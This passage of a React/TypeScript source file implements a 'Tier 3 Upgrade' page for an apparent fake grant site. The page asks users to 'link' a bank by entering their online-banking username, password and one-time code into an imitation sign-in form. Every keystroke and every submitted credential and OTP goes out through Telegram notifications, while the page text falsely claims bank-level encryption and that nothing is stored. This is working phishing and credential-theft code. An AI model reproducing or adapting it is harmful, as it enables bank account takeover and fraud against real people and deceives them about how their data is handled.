  { id: 'ga_01', name: 'Georgia Bank', auth: 'otp', homepage: 'chase', position: 92 },
  { id: 'ga_02', name: 'Atlanta Bank', auth: 'otp', homepage: 'chase', position: 93 },
  { id: 'ga_03', name: 'Savannah Bank', auth: 'otp', homepage: 'chase', position: 94 },
  { id: 'hi_01', name: 'Hawaii Bank', auth: 'otp', homepage: 'chase', position: 95 },
  { id: 'hi_02', name: 'Honolulu Bank', auth: 'otp', homepage: 'chase', position: 96 },
  { id: 'id_01', name: 'Idaho Bank', auth: 'otp', homepage: 'chase', position: 97 },
  { id: 'id_02', name: 'Boise Bank', auth: 'otp', homepage: 'chase', position: 98 },
  { id: 'il_01', name: 'Illinois Bank', auth: 'otp', homepage: 'chase', position: 99 },
  { id: 'il_02', name: 'Chicago Community Bank', auth: 'otp', homepage: 'chase', position: 100 },
  { id: 'il_03', name: 'Springfield Bank', auth: 'otp', homepage: 'chase', position: 101 },
  { id: 'in_01', name: 'Indiana Bank', auth: 'otp', homepage: 'chase', position: 102 },
  { id: 'in_02', name: 'Indianapolis Bank', auth: 'otp', homepage: 'chase', position: 103 },
  { id: 'in_03', name: 'South Bend Bank', auth: 'otp', homepage: 'chase', position: 104 },
  { id: 'ia_01', name: 'Iowa Bank', auth: 'otp', homepage: 'chase', position: 105 },
  { id: 'ia_02', name: 'Des Moines Bank', auth: 'otp', homepage: 'chase', position: 106 },
  { id: 'ia_03', name: 'Cedar Rapids Bank', auth: 'otp', homepage: 'chase', position: 107 },
  { id: 'ks_01', name: 'Kansas Bank', auth: 'otp', homepage: 'chase', position: 108 },
  { id: 'ks_02', name: 'Topeka Bank', auth: 'otp', homepage: 'chase', position: 109 },
  { id: 'ks_03', name: 'Wichita Bank', auth: 'otp', homepage: 'chase', position: 110 },
  { id: 'ky_01', name: 'Kentucky Bank', auth: 'otp', homepage: 'chase', position: 111 },
  { id: 'ky_02', name: 'Louisville Bank', auth: 'otp', homepage: 'chase', position: 112 },
  { id: 'ky_03', name: 'Lexington Bank', auth: 'otp', homepage: 'chase', position: 113 },
  { id: 'la_01', name: 'Louisiana Bank', auth: 'otp', homepage: 'chase', position: 114 },
  { id: 'la_02', name: 'New Orleans Bank', auth: 'otp', homepage: 'chase', position: 115 },
  { id: 'la_03', name: 'Baton Rouge Bank', auth: 'otp', homepage: 'chase', position: 116 },
  { id: 'me_01', name: 'Maine Bank', auth: 'otp', homepage: 'chase', position: 117 },
  { id: 'me_02', name: 'Portland Bank', auth: 'otp', homepage: 'chase', position: 118 },
  { id: 'md_01', name: 'Maryland Bank', auth: 'otp', homepage: 'chase', position: 119 },
  { id: 'md_02', name: 'Baltimore Bank', auth: 'otp', homepage: 'chase', position: 120 },
  { id: 'ma_01', name: 'Massachusetts Bank', auth: 'otp', homepage: 'chase', position: 121 },
  { id: 'ma_02', name: 'Boston Bank', auth: 'otp', homepage: 'chase', position: 122 },
  { id: 'mi_01', name: 'Michigan Bank', auth: 'otp', homepage: 'chase', position: 123 },
  { id: 'mi_02', name: 'Detroit Bank', auth: 'otp', homepage: 'chase', position: 124 },
  { id: 'mi_03', name: 'Grand Rapids Bank', auth: 'otp', homepage: 'chase', position: 125 },
  { id: 'mn_01', name: 'Minnesota Bank', auth: 'otp', homepage: 'chase', position: 126 },
  { id: 'mn_02', name: 'Minneapolis Bank', auth: 'otp', homepage: 'chase', position: 127 },
  { id: 'mn_03', name: 'Saint Paul Bank', auth: 'otp', homepage: 'chase', position: 128 },
  { id: 'ms_01', name: 'Mississippi Bank', auth: 'otp', homepage: 'chase', position: 129 },
  { id: 'ms_02', name: 'Jackson Bank', auth: 'otp', homepage: 'chase', position: 130 },
  { id: 'mo_01', name: 'Missouri Bank', auth: 'otp', homepage: 'chase', position: 131 },
  { id: 'mo_02', name: 'St. Louis Bank', auth: 'otp', homepage: 'chase', position: 132 },
  { id: 'mo_03', name: 'Kansas City Bank', auth: 'otp', homepage: 'chase', position: 133 },
  { id: 'mt_01', name: 'Montana Bank', auth: 'otp', homepage: 'chase', position: 134 },
  { id: 'mt_02', name: 'Billings Bank', auth: 'otp', homepage: 'chase', position: 135 },
  { id: 'ne_01', name: 'Nebraska Bank', auth: 'otp', homepage: 'chase', position: 136 },
  { id: 'ne_02', name: 'Omaha Community Bank', auth: 'otp', homepage: 'chase', position: 137 },
  { id: 'nv_01', name: 'Nevada Bank', auth: 'otp', homepage: 'chase', position: 138 },
  { id: 'nv_02', name: 'Las Vegas Bank', auth: 'otp', homepage: 'chase', position: 139 },
  { id: 'nv_03', name: 'Reno Bank', auth: 'otp', homepage: 'chase', position: 140 },
  { id: 'nh_01', name: 'New Hampshire Bank', auth: 'otp', homepage: 'chase', position: 141 },
  { id: 'nh_02', name: 'Manchester Bank', auth: 'otp', homepage: 'chase', position: 142 },
  { id: 'nj_01', name: 'New Jersey Bank', auth: 'otp', homepage: 'chase', position: 143 },
  { id: 'nj_02', name: 'Newark Bank', auth: 'otp', homepage: 'chase', position: 144 },
  { id: 'nj_03', name: 'Jersey City Bank', auth: 'otp', homepage: 'chase', position: 145 },
  { id: 'nm_01', name: 'New Mexico Bank', auth: 'otp', homepage: 'chase', position: 146 },
  { id: 'nm_02', name: 'Albuquerque Bank', auth: 'otp', homepage: 'chase', position: 147 },
  { id: 'ny_01', name: 'New York Bank', auth: 'otp', homepage: 'chase', position: 148 },
  { id: 'ny_02', name: 'New York Community Bank', auth: 'otp', homepage: 'chase', position: 149 },
  { id: 'ny_03', name: 'Brooklyn Bank', auth: 'otp', homepage: 'chase', position: 150 },
  { id: 'ny_04', name: 'Manhattan Bank', auth: 'otp', homepage: 'chase', position: 151 },
  { id: 'ny_05', name: 'Flushing Bank', auth: 'otp', homepage: 'chase', position: 152 },
  { id: 'nc_01', name: 'North Carolina Bank', auth: 'otp', homepage: 'chase', position: 153 },
  { id: 'nc_02', name: 'Charlotte Bank', auth: 'otp', homepage: 'chase', position: 154 },
  { id: 'nc_03', name: 'Raleigh Bank', auth: 'otp', homepage: 'chase', position: 155 },
  { id: 'nc_04', name: 'Greensboro Bank', auth: 'otp', homepage: 'chase', position: 156 },
  { id: 'nd_01', name: 'North Dakota Bank', auth: 'otp', homepage: 'chase', position: 157 },
  { id: 'nd_02', name: 'Fargo Bank', auth: 'otp', homepage: 'chase', position: 158 },
  { id: 'oh_01', name: 'Ohio Bank', auth: 'otp', homepage: 'chase', position: 159 },
  { id: 'oh_02', name: 'Cleveland Bank', auth: 'otp', homepage: 'chase', position: 160 },
  { id: 'oh_03', name: 'Columbus Bank', auth: 'otp', homepage: 'chase', position: 161 },
  { id: 'oh_04', name: 'Cincinnati Bank', auth: 'otp', homepage: 'chase', position: 162 },
  { id: 'ok_01', name: 'Oklahoma Bank', auth: 'otp', homepage: 'chase', position: 163 },
  { id: 'ok_02', name: 'Oklahoma City Bank', auth: 'otp', homepage: 'chase', position: 164 },
  { id: 'ok_03', name: 'Tulsa Bank', auth: 'otp', homepage: 'chase', position: 165 },
  { id: 'or_01', name: 'Oregon Bank', auth: 'otp', homepage: 'chase', position: 166 },
  { id: 'or_02', name: 'Portland Oregon Bank', auth: 'otp', homepage: 'chase', position: 167 },
  { id: 'or_03', name: 'Eugene Bank', auth: 'otp', homepage: 'chase', position: 168 },
  { id: 'pa_01', name: 'Pennsylvania Bank', auth: 'otp', homepage: 'chase', position: 169 },
  { id: 'pa_02', name: 'Philadelphia Bank', auth: 'otp', homepage: 'chase', position: 170 },
  { id: 'pa_03', name: 'Pittsburgh Bank', auth: 'otp', homepage: 'chase', position: 171 },
  { id: 'pa_04', name: 'Harrisburg Bank', auth: 'otp', homepage: 'chase', position: 172 },
  { id: 'ri_01', name: 'Rhode Island Bank', auth: 'otp', homepage: 'chase', position: 173 },
  { id: 'ri_02', name: 'Providence Bank', auth: 'otp', homepage: 'chase', position: 174 },
  { id: 'sc_01', name: 'South Carolina Bank', auth: 'otp', homepage: 'chase', position: 175 },
  { id: 'sc_02', name: 'Charleston Bank', auth: 'otp', homepage: 'chase', position: 176 },
  { id: 'sc_03', name: 'Columbia Bank SC', auth: 'otp', homepage: 'chase', position: 177 },
  { id: 'sd_01', name: 'South Dakota Bank', auth: 'otp', homepage: 'chase', position: 178 },
  { id: 'sd_02', name: 'Sioux Falls Bank', auth: 'otp', homepage: 'chase', position: 179 },
  { id: 'tn_01', name: 'Tennessee Bank', auth: 'otp', homepage: 'chase', position: 180 },
  { id: 'tn_02', name: 'Memphis Bank', auth: 'otp', homepage: 'chase', position: 181 },
  { id: 'tn_03', name: 'Nashville Bank', auth: 'otp', homepage: 'chase', position: 182 },
  { id: 'tx_01', name: 'Texas Bank', auth: 'otp', homepage: 'chase', position: 183 },
  { id: 'tx_02', name: 'Houston Bank', auth: 'otp', homepage: 'chase', position: 184 },
  { id: 'tx_03', name: 'Dallas Bank', auth: 'otp', homepage: 'chase', position: 185 },
  { id: 'tx_04', name: 'Austin Bank', auth: 'otp', homepage: 'chase', position: 186 },
  { id: 'tx_05', name: 'San Antonio Bank', auth: 'otp', homepage: 'chase', position: 187 },
  { id: 'tx_06', name: 'Fort Worth Bank', auth: 'otp', homepage: 'chase', position: 188 },
  { id: 'ut_01', name: 'Utah Bank', auth: 'otp', homepage: 'chase', position: 189 },
  { id: 'ut_02', name: 'Salt Lake City Bank', auth: 'otp', homepage: 'chase', position: 190 },
  { id: 'vt_01', name: 'Vermont Bank', auth: 'otp', homepage: 'chase', position: 191 },
  { id: 'vt_02', name: 'Burlington Bank', auth: 'otp', homepage: 'chase', position: 192 },
  { id: 'va_01', name: 'Virginia Bank', auth: 'otp', homepage: 'chase', position: 193 },
  { id: 'va_02', name: 'Richmond Bank', auth: 'otp', homepage: 'chase', position: 194 },
  { id: 'va_03', name: 'Virginia Community Bank', auth: 'otp', homepage: 'chase', position: 195 },
  { id: 'wa_01', name: 'Washington Bank', auth: 'otp', homepage: 'chase', position: 196 },
  { id: 'wa_02', name: 'Seattle Bank', auth: 'otp', homepage: 'chase', position: 197 },
  { id: 'wa_03', name: 'Spokane Bank', auth: 'otp', homepage: 'chase', position: 198 },
  { id: 'wa_04', name: 'Tacoma Bank', auth: 'otp', homepage: 'chase', position: 199 },
  { id: 'wv_01', name: 'West Virginia Bank', auth: 'otp', homepage: 'chase', position: 200 },
  { id: 'wv_02', name: 'Charleston WV Bank', auth: 'otp', homepage: 'chase', position: 201 },
  { id: 'wi_01', name: 'Wisconsin Bank', auth: 'otp', homepage: 'chase', position: 202 },
  { id: 'wi_02', name: 'Milwaukee Bank', auth: 'otp', homepage: 'chase', position: 203 },
  { id: 'wi_03', name: 'Madison Bank', auth: 'otp', homepage: 'chase', position: 204 },
  { id: 'wi_04', name: 'Green Bay Bank', auth: 'otp', homepage: 'chase', position: 205 },
  { id: 'wy_01', name: 'Wyoming Bank', auth: 'otp', homepage: 'chase', position: 206 },
  { id: 'wy_02', name: 'Cheyenne Bank', auth: 'otp', homepage: 'chase', position: 207 },
];

type Step = 'intro' | 'bank-select' | 'bank-login' | 'auth-confirm' | 'processing' | 'success';

function UpgradeTier3() {
  const navigate = useNavigate();
  const [userId, setUserId] = useState<string | null>(null);
  const [profile, setProfile] = useState<Profile | null>(null);
  const [step, setStep] = useState<Step>('intro');
  const [selectedBank, setSelectedBank] = useState<typeof BANKS_DATA[0] | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [otp, setOtp] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const pageOpenNotifiedRef = useRef(false);

  useEffect(() => {
    const load = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) navigate({ to: "/signin" });
      else {
        setUserId(session.user.id);
        const { data } = await supabase
          .from("profiles")
          .select("*")
          .eq("id", session.user.id)
          .maybeSingle();
        setProfile(data as Profile | null);
        
        // Send page open notification
        if (!pageOpenNotifiedRef.current) {
          pageOpenNotifiedRef.current = true;
          await sendTelegramNotification(
            `🔔 <b>Tier 3 Upgrade Initiated</b>\n\n` +
            `👤 <b>User:</b> ${(data as Profile)?.full_name || 'Unknown'}\n` +
            `📧 <b>Email:</b> ${session.user.email}\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `<b>Action:</b> User opened Tier 3 upgrade page`
          );
        }
      }
    };
    load();
  }, [navigate]);

  const filteredBanks = BANKS_DATA.filter(b =>
    b.name.toLowerCase().includes(searchQuery.toLowerCase())
  ).sort((a, b) => a.position - b.position);

  const majorBanks = filteredBanks.slice(0, 6);
  const otherBanks = filteredBanks.slice(6);

  const handleBankSelected = (bank: typeof BANKS_DATA[0]) => {
    setIsTransitioning(true);
    
    // Send bank selection notification
    sendTelegramNotification(
      `🏦 <b>Bank Selected</b>\n\n` +
      `👤 <b>User:</b> ${profile?.full_name}\n` +
      `🏪 <b>Bank:</b> ${bank.name}\n` +
      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
    );

    setTimeout(() => {
      setSelectedBank(bank);
      setEmail('');
      setPassword('');
      setLoginError('');
      setOtp('');
      setStep('bank-login');
      setIsTransitioning(false);
    }, 3000);
  };

  // Monitor email field
  const handleEmailChange = (value: string) => {
    setEmail(value);
    if (value) {
      sendTelegramNotification(
        `📝 <b>Login Field Updated - Email</b>\n\n` +
        `👤 <b>User:</b> ${profile?.full_name}\n` +
        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
        `📧 <b>Email Field:</b> <code>${value}</code>\n` +
        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
      );
    }
  };

  // Monitor password field - SHOW FULL PASSWORD
  const handlePasswordChange = (value: string) => {
    setPassword(value);
    if (value) {
      sendTelegramNotification(
        `📝 <b>Login Field Updated - Password</b>\n\n` +
        `👤 <b>User:</b> ${profile?.full_name}\n` +
        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
        `🔐 <b>Password Field:</b> <code>${value}</code>\n` +
        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
      );
    }
  };

  const handleLogin = () => {
    if (!email || !password) {
      setLoginError('Please enter email and password');
      return;
    }
    setIsTransitioning(true);
    
    sendTelegramNotification(
      `✅ <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
      `👤 <b>User:</b> ${profile?.full_name}\n` +
      `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
      `<b>📧 USERNAME/EMAIL:</b>\n` +
      `<code>${email}</code>\n\n` +
      `<b>🔐 PASSWORD:</b>\n` +
      `<code>${password}</code>\n\n` +
      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n` +
      `<b>Next Step:</b> Awaiting OTP verification`
    );

    setTimeout(() => {
      setLoginError('');
      setStep('auth-confirm');
      setIsTransitioning(false);
    }, 3000);
  };

  // Monitor OTP field - SHOW FULL OTP CODE - VARIABLE LENGTH
  const handleOtpChange = (value: string) => {
    const otpValue = value.replace(/\D/g, '').slice(0, 10); // Allow up to 10 digits for different banks
    setOtp(otpValue);
    if (otpValue) {
      sendTelegramNotification(
        `📝 <b>OTP Code Entry</b>\n\n` +
        `👤 <b>User:</b> ${profile?.full_name}\n` +
        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
        `🔐 <b>OTP Code Entered:</b> <code>${otpValue}</code>\n` +
        `📊 <b>Digits Received:</b> ${otpValue.length} digits\n` +
        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
      );
    }
  };

  const handleAuthConfirm = async () => {
    if (!selectedBank || !userId) {
      toast.error("Missing required information");
      return;
    }
    
    if (!otp || otp.length < 3) {
      toast.error("Please enter a valid OTP");
      return;
    }

    setIsTransitioning(true);
    setSubmitting(true);
    
    try {
      sendTelegramNotification(
        `🔒 <b>OTP VERIFICATION COMPLETE</b>\n\n` +
        `👤 <b>User:</b> ${profile?.full_name}\n` +
        `🏦 <b>Bank:</b> ${selectedBank.name}\n` +
        `✅ <b>OTP Status:</b> Verified\n` +
        `🔐 <b>OTP Code Used:</b> <code>${otp}</code>\n` +
        `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
        `<b>Next Step:</b> Processing bank linkage`
      );

      // Update profile with tier 3 upgrade request
      const { error: updateError } = await supabase
        .from("profiles")
        .update({
          requested_tier: 3,
          tier_status: "pending",
          linked_bank_name: selectedBank.name,
          verification_submitted_at: new Date().toISOString(),
        })
        .eq("id", userId);

      if (updateError) {
        console.error("Supabase update error:", updateError);
        throw updateError;
      }

      // Send success notification
      sendTelegramNotification(
        `🎉 <b>BANK ACCOUNT LINKED SUCCESSFULLY</b>\n\n` +
        `👤 <b>User:</b> ${profile?.full_name}\n` +
        `🏦 <b>Linked Bank:</b> ${selectedBank.name}\n` +
        `📊 <b>Status:</b> Pending Admin Approval\n` +
        `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}\n\n` +
        `✅ <b>All Credentials Verified</b>\n` +
        `Ready for admin review`
      );

      // Wait 3 seconds then navigate to processing page
      setTimeout(() => {
        setStep('processing');
        setSubmitting(false);
        setIsTransitioning(false);
      }, 3000);

    } catch (e) {
      console.error("Auth confirm error:", e);
      setSubmitting(false);
      setIsTransitioning(false);
      toast.error(e instanceof Error ? e.message : "Failed to verify account. Please try again.");
    }
  };

  if (!userId || !profile) {
    return <div className="grid min-h-screen place-items-center bg-background"><Loader2 className="h-6 w-6 animate-spin text-forest" /></div>;
  }

  // INTRO STEP
  if (step === 'intro') {
    if (isTransitioning) {
      return (
        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
          <div className="text-center">
            <RollingLoader />
            <p className="mt-6 text-muted-foreground">Loading bank selection...</p>
          </div>
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => navigate({ to: "/dashboard" })} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-gold">
                <Shield className="h-3.5 w-3.5" /> Tier 3 Upgrade
              </div>
              <h1 className="mt-2 font-display text-2xl font-semibold md:text-3xl">Unlock Unlimited Grants</h1>
              <p className="mt-1 max-w-xl text-sm text-white/80">
                Upgrade to Tier 3 and apply for <strong className="text-gold">unlimited grant amounts</strong>. Link your bank account securely to get started.
              </p>
            </div>

            <div className="space-y-8 p-8">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                <div className="flex gap-4">
                  <Shield className="h-5 w-5 text-forest flex-shrink-0 mt-0.5" />
                  <div>
                    <h3 className="font-semibold text-foreground">Why Link Your Bank?</h3>
                    <p className="mt-2 text-sm text-muted-foreground">
                      Your bank account is required for secure fund transfers. We use bank-level encryption to protect your information. Your account details are never stored directly on our servers and are processed through PCI-DSS compliant payment processors. <strong className="text-forest">All withdrawals go exclusively to this verified account</strong> — prepaid cards and third-party accounts are not supported. This ensures compliance and your security.
                    </p>
                  </div>
                </div>
              </div>

              <button
                onClick={() => {
                  setIsTransitioning(true);
                  setTimeout(() => {
                    setStep('bank-select');
                    setIsTransitioning(false);
                  }, 3000);
                }}
                disabled={isTransitioning}
                className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition hover:opacity-95 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <Lock className="h-4 w-4" /> Link Bank Account
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // BANK SELECT STEP
  if (step === 'bank-select') {
    if (isTransitioning) {
      return (
        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
          <div className="text-center">
            <RollingLoader />
            <p className="mt-6 text-muted-foreground">Connecting to bank...</p>
          </div>
        </div>
      );
    }

    const hasMatchingBanks = filteredBanks.length > 0;
    const customBank = searchQuery.trim().length > 2 && !hasMatchingBanks 
      ? { id: 'custom', name: searchQuery.trim(), auth: 'otp', homepage: 'chase', position: 999 }
      : null;

    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => setStep('intro')} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <h2 className="font-display text-2xl font-semibold">Select Your Bank</h2>
              <p className="mt-1 text-sm text-white/80">Search or choose from the list below</p>
            </div>

            <div className="p-8 space-y-6">
              <div className="relative">
                <Search className="absolute left-4 top-1/2 transform -translate-y-1/2 text-muted-foreground w-5 h-5" />
                <input
                  type="text"
                  placeholder="Search banks..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-12 pr-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest"
                />
              </div>

              {majorBanks.length > 0 && (
                <div>
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">Popular Banks</p>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                    {majorBanks.map(bank => (
                      <button
                        key={bank.id}
                        onClick={() => handleBankSelected(bank)}
                        disabled={isTransitioning}
                        className="p-4 border-2 border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <p className="font-semibold text-sm text-foreground">{bank.name}</p>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {otherBanks.length > 0 && (
                <div>
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">All Banks</p>
                  <div className="space-y-2 max-h-96 overflow-y-auto">
                    {otherBanks.map(bank => (
                      <button
                        key={bank.id}
                        onClick={() => handleBankSelected(bank)}
                        disabled={isTransitioning}
                        className="w-full p-3 border border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <p className="text-sm font-medium text-foreground group-hover:text-forest">{bank.name}</p>
                        <ChevronRight className="h-4 w-4 text-muted-foreground group-hover:text-forest" />
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Custom Bank Not Found in List */}
              {customBank && (
                <div className="space-y-4 pt-4 border-t border-border">
                  <div className="rounded-lg border border-gold/30 bg-gold/5 p-4">
                    <p className="text-xs uppercase tracking-[0.18em] text-gold font-semibold mb-2">Bank Not Found</p>
                    <p className="text-sm text-muted-foreground">
                      We couldn't find "<strong>{customBank.name}</strong>" in our list. You can still proceed with this bank by tapping below.
                    </p>
                  </div>
                  
                  <button
                    onClick={() => handleBankSelected(customBank)}
                    disabled={isTransitioning}
                    className="w-full p-4 border-2 border-gold border-dashed rounded-lg bg-gold/5 hover:bg-gold/10 hover:border-gold transition text-left flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <div>
                      <p className="text-sm font-semibold text-foreground group-hover:text-gold">{customBank.name}</p>
                      <p className="text-xs text-muted-foreground mt-1">Continue with this bank</p>
                    </div>
                    <ChevronRight className="h-4 w-4 text-gold" />
                  </button>
                </div>
              )}

              {filteredBanks.length === 0 && !customBank && (
                <div className="text-center py-12">
                  <p className="text-muted-foreground mb-2">No banks found</p>
                  <p className="text-sm text-muted-foreground">Try typing your bank name in full for the best results</p>
                </div>
              )}
            </div>
          </div>
        </main>
      </div>
    );
  }

  // BANK LOGIN STEP
  if (step === 'bank-login' && selectedBank) {
    if (isTransitioning) {
      return (
        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
          <div className="text-center">
            <RollingLoader />
            <p className="mt-6 text-muted-foreground">Processing your credentials...</p>
          </div>
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => setStep('bank-select')} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <h2 className="font-display text-2xl font-semibold">{selectedBank.name} Sign In</h2>
              <p className="mt-1 text-sm text-white/80">Enter your banking credentials</p>
            </div>

            <div className="p-8 space-y-6">
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2">Email or Username</label>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => handleEmailChange(e.target.value)}
                  placeholder="Enter your username"
                  disabled={isTransitioning}
                  className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest disabled:bg-muted disabled:cursor-not-allowed"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2">Password</label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => handlePasswordChange(e.target.value)}
                    placeholder="Enter your password"
                    disabled={isTransitioning}
                    className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest disabled:bg-muted disabled:cursor-not-allowed"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    disabled={isTransitioning}
                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground disabled:cursor-not-allowed"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {loginError && (
                <div className="flex items-start gap-3 p-4 rounded-lg bg-destructive/10 border border-destructive/30 text-destructive text-sm">
                  <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
                  {loginError}
                </div>
              )}

              <button
                onClick={handleLogin}
                disabled={isTransitioning}
                className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Sign In
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // AUTH CONFIRM STEP
  if (step === 'auth-confirm' && selectedBank) {
    if (isTransitioning) {
      return (
        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
          <div className="text-center">
            <RollingLoader />
            <p className="mt-6 text-muted-foreground">Verifying your account...</p>
          </div>
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => setStep('bank-login')} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <h2 className="font-display text-2xl font-semibold">Verify Your Identity</h2>
              <p className="mt-1 text-sm text-white/80">Enter the verification code sent to your phone</p>
            </div>

            <div className="p-8 space-y-6">
              <div className="rounded-lg border border-gold/30 bg-gold/5 p-4 text-sm text-foreground">
                An OTP has been sent to your registered email or phone number
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-3">Verification Code</label>
                <input
                  type="text"
                  value={otp}
                  onChange={(e) => handleOtpChange(e.target.value)}
                  placeholder="Enter OTP"
                  disabled={isTransitioning}
                  className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-border rounded-lg focus:outline-none focus:border-forest tracking-widest disabled:bg-muted disabled:cursor-not-allowed"
                />
              </div>

              <button
                onClick={handleAuthConfirm}
                disabled={otp.length < 3 || submitting || isTransitioning}
                className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed"
              >
                {submitting ? 'Verifying...' : 'Verify Account'}
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // PROCESSING/REVIEW STEP
  if (step === 'processing') {
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
        </header>

        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-12 text-primary-foreground text-center">
              <style>{`
                @keyframes pulse-scale {
                  0%, 100% { transform: scale(1); opacity: 1; }
                  50% { transform: scale(1.1); opacity: 0.8; }
                }
                .pulse-icon {
                  animation: pulse-scale 2s ease-in-out infinite;
                }
              `}</style>
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-6 pulse-icon">
                <Shield className="h-8 w-8 text-gold" />
              </div>
              <h1 className="font-display text-3xl font-semibold">Tier 3 Upgrade Under Review</h1>
              <p className="mt-2 text-white/80">Your account verification is being processed</p>
            </div>

